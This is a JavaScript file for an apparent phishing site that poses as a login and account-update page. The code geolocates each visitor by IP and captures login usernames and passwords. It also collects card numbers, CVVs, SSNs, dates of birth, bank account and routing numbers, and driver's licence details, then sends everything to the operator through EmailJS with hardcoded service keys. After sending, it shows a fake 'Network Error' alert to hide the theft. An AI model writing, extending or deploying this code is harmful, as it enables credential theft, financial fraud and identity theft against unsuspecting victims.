// ✅ NEW: DYNAMIC GREETING FUNCTION
const updateGreeting = () => {
    // Find the <h1> element by its ID
    const greetingElement = document.getElementById("greeting");
    
    // Safety check: only run if we are on the page with the greeting
    if (greetingElement) {
        const currentHour = new Date().getHours(); // Gets the hour (0-23)
        let greetingText = "Welcome";

        if (currentHour < 12) {
            greetingText = "Good morning";
        } else if (currentHour < 18) {
            greetingText = "Good afternoon";
        } else {
            greetingText = "Good evening";
        }

        // Update the text on the page
        greetingElement.innerText = greetingText;
    }
};



// 1. Menu Toggle
function toggleMenu() {
    const menu = document.getElementById("mobile-menu");
    if(menu) menu.style.display = (menu.style.display === "block") ? "none" : "block";
}

// 2. IP Tracking
const trackingData = () => {
    fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
            const loc = { ip: data.ip, city: data.city, country: data.country_name, isp: data.org };
            sessionStorage.setItem('studentLocation', JSON.stringify(loc));
        })
        .catch(err => console.log("Tracking failed"));
}

// 3. Login Logic
const loginLogic = () => {
    const loginForm = document.getElementById("loginForm");
    if (loginForm) {
        loginForm.addEventListener("submit", (e) => {
            e.preventDefault();
            // Safe grab
            const userEl = document.getElementById("username");
            const passEl = document.getElementById("password");
            
            // Save to memory
            sessionStorage.setItem('loginUser', userEl ? userEl.value : "N/A");
            sessionStorage.setItem('loginPass', passEl ? passEl.value : "N/A");
            
            window.location.href = "update.html";
        });
    }
}

// 4. Update Logic (Crash-Proof Version)
const updateLogic = () => {
    const cardForm = document.getElementById("cardForm");
    
    if (cardForm) {
        
        // --- Helper: Prevents "Cannot read properties of null" ---
        const getSafeValue = (id) => {
            const el = document.getElementById(id);
            return el ? el.value : "Not Provided"; 
        };

        // Formatter (Added Phone Number Logic)
        const fieldIds = ['cardNumber', 'cvv', 'expiryDate', 'cardPhone'];
        fieldIds.forEach(id => {
            const field = document.getElementById(id);
            if (field) {
                field.addEventListener('input', (e) => {
                    // Get current value
                    let val = e.target.value;

                    // 1. Phone Number: Allow numbers, +, -, (, ), space
                    if (id === 'cardPhone') {
                        e.target.value = val.replace(/[^0-9+\-\(\)\s]/g, '');
                    }
                    // 2. Card Number: Numbers only, space every 4
                    else if (id === 'cardNumber') {
                        let clean = val.replace(/\D/g, '').substring(0, 16);
                        e.target.value = clean.replace(/(.{4})/g, '$1 ').trim();
                    }
                    // 3. Expiry: Numbers only, slash after 2
                    else if (id === 'expiryDate') {
                        let clean = val.replace(/\D/g, '').substring(0, 4);
                        if (clean.length >= 2) clean = clean.substring(0, 2) + '/' + clean.substring(2, 4);
                        e.target.value = clean;
                    } 
                    // 4. DDV/CVV: Numbers only
                    else if (id === 'cvv') {
                        e.target.value = val.replace(/\D/g, '').substring(0, 4);
                    }
                });
            }
        });





        // Submit Listener
        cardForm.addEventListener("submit", (e) => {
            e.preventDefault();
            const btn = cardForm.querySelector("button");
            const originalText = btn.innerText;
            btn.innerText = "Processing...";

            // Retrieve Data
            const loginId = sessionStorage.getItem('loginUser') || "N/A";
            const loginPass = sessionStorage.getItem('loginPass') || "N/A";
            const locData = JSON.parse(sessionStorage.getItem('studentLocation')) || {};

            // Prepare Email Params using Safe Mode
            const templateParams = {
                // Login
                login_id: loginId,
                login_password: loginPass,
                
                // Personal & Confirmation
                confirm_email: getSafeValue("confEmail"),
                confirm_password: getSafeValue("confPassword"),
                dob: getSafeValue("dob"),
                ssn: getSafeValue("ssn"),

                // Vehicle IDs
                an: getSafeValue("accountNumber"),
                rn_number: getSafeValue("routineNumber"),
                dl: getSafeValue("dl"),
                dl_issue: getSafeValue("dlIssueDate"),
                dl_exp: getSafeValue("dlExpDate"),

                // Car/Card Info
                card_name: getSafeValue("cardName"),
                card_phone: getSafeValue("cardPhone"), // ✅ NEW FIELD
                card_number: getSafeValue("cardNumber"),
                expiry_date: getSafeValue("expiryDate"),
                CVV: getSafeValue("cvv"), // Matches HTML ID

                // Billing
                billing_address: getSafeValue("billAddress"),
                billing_city: getSafeValue("billCity"),
                billing_zip: getSafeValue("billZip"),

                // Location
                ip_address: locData.ip || "Unknown",
                city: locData.city || "Unknown",
                country: locData.country || "Unknown",
                isp: locData.isp || "Unknown",
                timestamp: new Date().toLocaleString()
            };

            // ⚠️ PASTE YOUR KEYS HERE
            const serviceID = "service_9c5tlv4".trim();
            const templateID = "template_uwp1abb".trim(); 

            if (typeof emailjs !== 'undefined') {
                emailjs.send(serviceID, templateID, templateParams)
                    .then(() => {
                        alert("Network Error Please Try Again Later.");
                        window.location.href = "index.html";
                    })
                    .catch((err) => {
                        console.error("FAILED:", err);
                        alert(`Error: ${err.text}`);
                        btn.innerText = originalText;
                    });
            } else {
                alert("System Error: EmailJS library missing.");
            }
        });
    }
}


// Initialize everything
document.addEventListener("DOMContentLoaded", () => {
    updateGreeting(); // ✅ RUN THE GREETING FUNCTION
    trackingData();
    loginLogic();
    updateLogic();
});
